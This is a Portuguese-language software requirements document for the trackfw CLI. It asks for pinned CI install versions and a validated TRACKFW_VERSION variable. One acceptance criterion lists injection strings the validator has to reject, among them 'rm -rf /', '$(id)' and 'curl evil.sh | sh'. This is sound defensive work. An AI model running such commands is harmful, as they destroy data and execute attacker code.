---
status: Open
date: 2026-08-28
author: "trackfw_architect (Zeus)"
adr: "ADR-2026-08-28-gate-de-ci-gerado-nasce-pinado-na-versao-que-o-gerou-e-o-install-sh-honra-trackfw-version.md"
roadmap: "docs/roadmaps/wip/ROADMAP-2026-08-28-gate-de-ci-pinado-na-versao-geradora-e-install-sh-honrando-trackfw-version.md"
---

# REQ: Gate de CI gerado instala versão não pinada do trackfw e não há como pinar

> Date: 2026-08-28 | Status: Open

## Motivation

O workflow que o `trackfw init` gera instala a ferramenta com
`curl -sSfL .../releases/latest/download/install.sh | sh`, e `scripts/install.sh:33-44` resolve a
versão via `api.github.com/.../releases/latest`, **ignorando de qual tag o script foi baixado**.
Não existe env var, argumento nem flag que aceite uma versão: **ninguém consegue pinar**, nem
sabendo do problema.

Consequência: `trackfw validate` é bloqueante de PR, então uma release nova com regra mais estrita
reprova PRs sem que nada no repositório tenha mudado. O artefato que deveria dar reprodutibilidade
à entrega é o ponto não reprodutível.

Já cobrou preço: em 2026-08-27, no cmdb, um `trackfw update` reescreveu o workflow e apagou o pin
`TRACKFW_VERSION: "7.0.0"`, o `timeout-minutes: 10` e o comentário do ML-0D. O usuário havia
resolvido saindo do caminho suportado — tarball direto, escrito à mão. O defeito não é o `update`
sobrescrever (`ADR-2026-08-27` decidiu que propriedade é pelo caminho e customização não é
suportada); é o **asset gerado estar errado**, obrigando à customização.

## Acceptance Criteria

- [ ] **AC1** — `scripts/install.sh` instala a versão de `TRACKFW_VERSION` quando ela está definida
      e não vazia. Verificável: `TRACKFW_VERSION=7.2.0 sh install.sh` instala 7.2.0 com a release
      corrente sendo maior.
- [ ] **AC2** — Com `TRACKFW_VERSION` ausente **ou vazia**, o script resolve a release mais recente
      exatamente como hoje. Comportamento padrão inalterado.
- [ ] **AC3** — O valor é validado contra `^v?[0-9]+\.[0-9]+\.[0-9]+$` **antes** de compor qualquer
      URL ou invocar `curl`/`wget`. Valor inválido aborta com exit code não-zero e mensagem que
      nomeia a variável e o formato esperado.
- [ ] **AC4** — A validação de AC3 rejeita, com teste explícito para cada um:
      `7.3.0; rm -rf /`, `../../etc`, `$(id)`, `7.3.0 && curl evil.sh | sh`, `v7.3.0\nFOO`, e
      string vazia com só espaços. Nenhum deles pode chegar a compor URL.
- [ ] **AC5** — `TRACKFW_VERSION` aceita tanto `7.3.0` quanto `v7.3.0`; ambos baixam o mesmo asset.
- [ ] **AC6** — O template de GitHub Actions gerado contém `TRACKFW_VERSION: "<versão do binário>"`
      no bloco `env:` do job e `timeout-minutes: 10`. Verificável nos 3 CLIs: gerar em sandbox e
      comparar a string com a versão que o binário reporta em `--version`.
- [ ] **AC7** — O template de GitLab CI gerado pina pelo mesmo mecanismo (`variables:` com
      `TRACKFW_VERSION`), nos 3 CLIs.
- [ ] **AC8** — Os 3 CLIs geram workflow **byte-idêntico** para a mesma versão. Gate de paridade
      falsificável cobre isso e falha se um dos três divergir.
- [ ] **AC9** — `trackfw update` num projeto com workflow pinado numa versão antiga reescreve o pin
      para a versão do binário e reporta o alvo como `updated` (Go e Node; Python segue sem o alvo
      `ci-workflow`, lacuna já documentada).
- [ ] **AC10** — `trackfw doctor` num projeto cujo workflow está pinado em versão diferente da do
      binário reporta `[scaffold-divergent]` com remédio `trackfw update`, nos 3 CLIs.
- [ ] **AC11** — `trackfw doctor` num projeto recém-gerado pelo mesmo binário reporta
      `no mismatches` — o pin não pode gerar divergência contra si mesmo.
- [ ] **AC12** — O comentário de `scaffold_doctor.go:62` (e equivalentes Node/Python) que declara o
      builder cfg-independente é corrigido: continua cfg-independente, deixou de ser
      version-independente.
- [ ] **AC13** — As ocorrências da linha não pinada em textos gerados de CLAUDE.md/docs
      (`npm/src/generators/init.js`, `pypi/trackfw/generators/init_gen.py`) são atualizadas ou
      explicitamente declaradas fora do pin, sem sobrar instrução contraditória em nenhum dos 3.
- [ ] **AC14** — `docs/cli-parity.md` tem seção anotada com `gate=` para o contrato do pin;
      `scripts/check-parity-contract-coverage.sh` continua verde.
- [ ] **AC15** — `TRACKFW_DISABLE_EXTERNAL_COMMANDS=1 make quality` → exit 0.

## Negative Scope

Explicitamente **fora** desta REQ:

- **Não** registrar `.github/workflows/` no `integrations-manifest.json`. `ADR-2026-08-27` fica
  inteiro de pé: propriedade pelo caminho, sem migração.
- **Não** fazer o `update` recusar sobrescrever workflow divergente, nem adicionar `--force` a ele.
  Sobrescrever é o comportamento desenhado; a correção é o template nascer certo.
- **Não** fechar a lacuna do alvo `ci-workflow` no `update` do CLI Python.
- **Não** aceitar versão por argumento posicional ou flag no `install.sh` — apenas env var.
- **Não** tocar em `.github/workflows/` deste repositório (os workflows do próprio trackfw são
  mantidos à mão e não são gerados pelo scaffold).
- **Não** corrigir os artefatos do projeto cmdb. É outro repositório, outra sessão.
- **Não** resolver os resíduos de backlog (`package-lock.json` em 6.1.0, sanitização de valor do
  `agent_models`, mensagens de `~usuario/`, teste do guard de Windows em Node/Python,
  `discover.go` sem `Chmod`).

## Linked ADR
ADR: ADR-2026-08-28-gate-de-ci-gerado-nasce-pinado-na-versao-que-o-gerou-e-o-install-sh-honra-trackfw-version.md

## Blocked by ADRs
<!-- none -->

## Linked Roadmap
Roadmap: docs/roadmaps/wip/ROADMAP-2026-08-28-gate-de-ci-pinado-na-versao-geradora-e-install-sh-honrando-trackfw-version.md
